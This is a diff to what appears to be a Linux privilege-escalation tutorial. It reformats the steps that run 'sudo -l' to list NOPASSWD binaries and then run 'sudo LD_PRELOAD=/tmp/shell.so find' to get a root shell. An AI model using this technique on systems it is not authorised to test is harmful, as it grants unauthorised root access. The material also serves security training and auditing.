@@ -49,7 +49,7 @@ void _init() {
 
 ## And Type Command 
    
-   sudo -l
+      sudo -l
    
 ## And Output 
 
@@ -69,7 +69,9 @@ void _init() {
            (root) NOPASSWD: /usr/sbin/apache2
            (root) NOPASSWD: /bin/more
 
-Execute any binary with the LD_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <and Type NOPASSWD program name >`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
+Execute any binary with the LD_PRELOAD to spawn a shell : 
+          `sudo LD_PRELOAD=<full_path_to_so_file> <and Type NOPASSWD program name just vim,nano,apache2,ftp,find etc >`
+	  , e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
 
 
